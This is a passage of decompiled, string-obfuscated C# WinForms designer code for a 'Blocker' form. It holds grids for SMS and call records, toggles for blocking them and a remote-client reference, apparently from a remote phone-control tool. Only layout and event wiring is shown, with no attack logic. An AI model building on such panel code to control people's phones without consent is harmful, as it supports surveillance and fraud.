using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class Blocker : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nav2btn")]
	private DrakeUIButtonIcon _nav2btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nav1btn")]
	private DrakeUIButtonIcon _nav1btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refbtm")]
	private DrakeUIButtonIcon _refbtm;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("activecalls")]
	private DrakeUICheckBox _activecalls;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV_SMS")]
	private DataGridView _DGV_SMS;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("activesms")]
	private DrakeUICheckBox _activesms;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Combodats_sms")]
	private DrakeUIComboBox _Combodats_sms;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Combodats_calls")]
	private DrakeUIComboBox _Combodats_calls;

	public BTClient Btcli;

	public bool waitload;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TableLayoutPanel3")]
	internal virtual TableLayoutPanel TableLayoutPanel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon nav2btn
	{
		[CompilerGenerated]
		get
		{
			return _nav2btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nav2btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nav2btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nav2btn = value;
			drakeUIButtonIcon = _nav2btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon nav1btn
	{
		[CompilerGenerated]
		get
		{
			return _nav1btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nav1btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nav1btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nav1btn = value;
			drakeUIButtonIcon = _nav1btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panelcenter")]
	internal virtual Panel panelcenter
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelcalls")]
	internal virtual Panel panelcalls
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelsms")]
	internal virtual Panel panelsms
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGVCALLS")]
	public virtual DataGridView DGVCALLS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apicoclm")]
	internal virtual DataGridViewImageColumn apicoclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numculm")]
	internal virtual DataGridViewTextBoxColumn numculm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acctclum")]
	internal virtual DataGridViewTextBoxColumn acctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("instlclum")]
	internal virtual DataGridViewTextBoxColumn instlclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon refbtm
	{
		[CompilerGenerated]
		get
		{
			return _refbtm;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = refbtm_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refbtm;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refbtm = value;
			drakeUIButtonIcon = _refbtm;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox activecalls
	{
		[CompilerGenerated]
		get
		{
			return _activecalls;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = activecalls_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _activecalls;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_activecalls = value;
			drakeUICheckBox = _activecalls;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGV_SMS
	{
		[CompilerGenerated]
		get
		{
			return _DGV_SMS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			EventHandler value3 = DGV0_SelectionChanged;
			DataGridView dataGridView = _DGV_SMS;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
				dataGridView.SelectionChanged -= value3;
			}
			_DGV_SMS = value;
			dataGridView = _DGV_SMS;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
				dataGridView.SelectionChanged += value3;
			}
		}
	}

	[field: AccessedThroughProperty("partclm")]
	internal virtual DataGridViewTextBoxColumn partclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("adresclm")]
	internal virtual DataGridViewTextBoxColumn adresclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("namclum")]
	internal virtual DataGridViewTextBoxColumn namclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dateclum")]
	internal virtual DataGridViewTextBoxColumn dateclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("smspath")]
	internal virtual DataGridViewTextBoxColumn smspath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logtext")]
	internal virtual RichTextBox logtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox activesms
	{
		[CompilerGenerated]
		get
		{
			return _activesms;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = activesms_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _activesms;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_activesms = value;
			drakeUICheckBox = _activesms;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox Combodats_sms
	{
		[CompilerGenerated]
		get
		{
			return _Combodats_sms;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Combodats_sms_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _Combodats_sms;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_Combodats_sms = value;
			drakeUIComboBox = _Combodats_sms;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox Combodats_calls
	{
		[CompilerGenerated]
		get
		{
			return _Combodats_calls;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Combodats_calls_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _Combodats_calls;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_Combodats_calls = value;
			drakeUIComboBox = _Combodats_calls;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	public Blocker()
	{
		base.Load += Blocker_Load;
		waitload = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.Blocker));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.TableLayoutPanel3 = new System.Windows.Forms.TableLayoutPanel();
		this.nav2btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.nav1btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.panelcenter = new System.Windows.Forms.Panel();
		this.panelsms = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.DGV_SMS = new System.Windows.Forms.DataGridView();
		this.partclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.adresclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.namclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dateclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.smspath = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.logtext = new System.Windows.Forms.RichTextBox();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.activesms = new DrakeUI.Framework.DrakeUICheckBox();
		this.DrakeWidth_W9 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Combodats_sms = new DrakeUI.Framework.DrakeUIComboBox();
		this.panelcalls = new System.Windows.Forms.Panel();
		this.DGVCALLS = new System.Windows.Forms.DataGridView();
		this.apicoclm = new System.Windows.Forms.DataGridViewImageColumn();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.numculm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.acctclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.instlclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.activecalls = new DrakeUI.Framework.DrakeUICheckBox();
		this.refbtm = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.Combodats_calls = new DrakeUI.Framework.DrakeUIComboBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.TableLayoutPanel3.SuspendLayout();
		this.panelcenter.SuspendLayout();
		this.panelsms.SuspendLayout();
		this.Panel5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV_SMS).BeginInit();
		this.Panel6.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.panelcalls.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVCALLS).BeginInit();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(862, 5);
		this.minibtn.Location = new System.Drawing.Point(904, 5);
		this.closbtn.Location = new System.Drawing.Point(946, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.callphone;
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(978, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(988, 26);
		this.Panel2.Controls.Add(this.TableLayoutPanel3);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._3F361D0E;
		this.Panel2.Size = new System.Drawing.Size(988, 64);
		this.Panel2.TabIndex = 40;
		this.TableLayoutPanel3.ColumnCount = 2;
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel3.Controls.Add(this.nav2btn, 0, 0);
		this.TableLayoutPanel3.Controls.Add(this.nav1btn, 0, 0);
		this.TableLayoutPanel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TableLayoutPanel3.Location = new System.Drawing.Point(0, 0);
		this.TableLayoutPanel3.Name = EXGuarder._0F1C7270;
		this.TableLayoutPanel3.RowCount = 1;
		this.TableLayoutPanel3.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel3.Size = new System.Drawing.Size(988, 64);
		this.TableLayoutPanel3.TabIndex = 38;
		this.nav2btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nav2btn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.nav2btn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nav2btn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav2btn.Font = new System.Drawing.Font(EXGuarder._3A761A16, 10f, System.Drawing.FontStyle.Bold);
		this.nav2btn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav2btn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav2btn.Location = new System.Drawing.Point(497, 3);
		this.nav2btn.Name = EXGuarder._65520C63;
		this.nav2btn.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.nav2btn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nav2btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nav2btn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav2btn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.nav2btn.Size = new System.Drawing.Size(488, 58);
		this.nav2btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nav2btn.Symbol = 61664;
		this.nav2btn.SymbolSize = 25;
		this.nav2btn.TabIndex = 68;
		this.nav2btn.Text = EXGuarder._111B296F;
		this.nav2btn.TipsColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nav1btn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.nav1btn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nav1btn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nav1btn.Font = new System.Drawing.Font(EXGuarder._3A761A16, 10f, System.Drawing.FontStyle.Bold);
		this.nav1btn.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nav1btn.Location = new System.Drawing.Point(3, 3);
		this.nav1btn.Name = EXGuarder._3537654A;
		this.nav1btn.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.nav1btn.RectColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nav1btn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nav1btn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.nav1btn.Size = new System.Drawing.Size(488, 58);
		this.nav1btn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nav1btn.Symbol = 62112;
		this.nav1btn.SymbolSize = 25;
		this.nav1btn.TabIndex = 66;
		this.nav1btn.Text = EXGuarder._02151244;
		this.nav1btn.TipsColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.panelcenter.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.panelcenter.Controls.Add(this.panelsms);
		this.panelcenter.Controls.Add(this.panelcalls);
		this.panelcenter.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panelcenter.Location = new System.Drawing.Point(2, 128);
		this.panelcenter.Name = EXGuarder._123B6D3B;
		this.panelcenter.Size = new System.Drawing.Size(988, 684);
		this.panelcenter.TabIndex = 41;
		this.panelsms.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.panelsms.Controls.Add(this.Panel5);
		this.panelsms.Controls.Add(this.Panel6);
		this.panelsms.Controls.Add(this.Panel7);
		this.panelsms.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panelsms.Location = new System.Drawing.Point(0, 0);
		this.panelsms.Name = EXGuarder._28653D28;
		this.panelsms.Size = new System.Drawing.Size(988, 684);
		this.panelsms.TabIndex = 0;
		this.Panel5.Controls.Add(this.DGV_SMS);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(0, 51);
		this.Panel5.Name = EXGuarder._39321E54;
		this.Panel5.Padding = new System.Windows.Forms.Padding(4);
		this.Panel5.Size = new System.Drawing.Size(487, 633);
		this.Panel5.TabIndex = 41;
		this.DGV_SMS.AllowUserToAddRows = false;
		this.DGV_SMS.AllowUserToDeleteRows = false;
		this.DGV_SMS.AllowUserToResizeColumns = false;
		this.DGV_SMS.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_SMS.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV_SMS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV_SMS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV_SMS.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV_SMS.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV_SMS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV_SMS.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_SMS.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV_SMS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV_SMS.ColumnHeadersVisible = false;
		this.DGV_SMS.Columns.AddRange(this.partclm, this.adresclm, this.namclum, this.dateclum, this.smspath);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_SMS.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV_SMS.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV_SMS.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV_SMS.EnableHeadersVisualStyles = false;
		this.DGV_SMS.GridColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DGV_SMS.Location = new System.Drawing.Point(4, 4);
		this.DGV_SMS.MultiSelect = false;
